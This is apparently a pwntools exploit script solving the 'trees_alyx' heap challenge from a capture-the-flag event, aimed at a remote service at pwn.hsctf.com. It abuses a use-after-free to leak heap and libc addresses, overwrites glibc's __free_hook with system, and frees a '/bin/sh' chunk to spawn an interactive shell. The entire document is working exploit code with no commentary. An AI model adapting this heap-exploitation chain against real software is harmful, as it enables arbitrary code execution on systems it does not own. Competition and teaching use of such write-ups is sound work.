from pwn import *

e = ELF("./trees_alyx")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("pwn.hsctf.com", 5008)
else:
  p = process(e.path)
  # {"LD_PRELOAD": libc.path})

def alloc():
  p.sendlineafter(">", "1")
  p.recvuntil("has ID ")

  return int(p.recvuntil(",", drop=True))

def alloc2(idx, size, data="AAAA", name="AAAA", skip=False):
  p.sendlineafter(">", "3")
  p.sendlineafter(">", str(idx))
  if skip:
    p.sendlineafter("new name.", str(size))
    p.sendlineafter("description.", data)
    p.sendlineafter("amount.", "0")
  else:
    p.sendlineafter("new name.", name)
    p.sendlineafter(">", str(size))
    p.sendlineafter("description.", data)
    p.sendlineafter("amount.", "0")


def delete(idx):
  p.sendlineafter(">", "2")
  p.sendlineafter(">", str(idx))

def view(idx):
  p.sendlineafter(">", "4")
  p.sendlineafter(">", str(idx))


debug()

delete(alloc())

B = 0x1337

A = alloc()
alloc2(A, 0x38)
alloc2(A, 0x58, p64(0) * 2 + p64(0) * 6 + p32(0) + p32(B))

delete(0)

delete(A)

view(0)

p.recvuntil("> ")
leak = int(p.recvuntil(" "))
print(hex(leak))

alloc2(0, 0x38, (p64(0) * 4 + p64(leak + 0x50)).ljust(0x37, "\x00"), skip=True)

alloc2(B, 0x3f0, p64(0) * 3 + p64(0xa1).ljust(0xa0, "\x00") + p64(0x21).ljust(0x20, "\x00") * 2 + p64(0x51) + p64(0) * 3 + p64(0x21), skip=True)

alloc2(0, 0x48, skip=True)

alloc2(B, 0x38, (p64(0) + p64(leak + 0xc0) + p64(0) * 2 + p64(leak + 0x50)), skip=True)
alloc2(0, 0x48, skip=True)

alloc2(B, 0x38, (p64(0) + p64(leak + 0xc0 + 0x50) + p64(0) * 2 + p64(leak + 0x50)), skip=True)

view(0)
p.recvuntil("Description: ")

libc_base = u64(p.recvline(keepends=False).ljust(8, "\x00")) - 0x7f779d879ca0 + 0x00007f779d695000
print(hex(libc_base))

alloc2(B, 0x38, (p64(0) + p64(leak + 0x1a0) + p64(0) * 2 + p64(leak + 0x50)), skip=True)
alloc2(0, 0xf8, skip=True)

alloc2(B, 0x38, (p64(0) + p64(leak + 0x1c0) + p64(0) * 2 + p64(leak + 0x50)), skip=True)
alloc2(0, 0xf8, skip=True)

alloc2(0, 0x48, p64(0) * 3 + p64(0x21) + p64(libc_base + libc.symbols["__free_hook"] - 8), skip=True)
alloc2(0, 0x18, skip=True)

alloc2(B, 0x38, (p64(0) * 4 + p64(leak + 0x50)), skip=True)
alloc2(0, 0x18, "/bin/sh\x00" + p64(libc_base + libc.symbols["system"]), skip=True)

p.sendlineafter(">", "2")
p.sendlineafter(">", "0")

p.interactive()
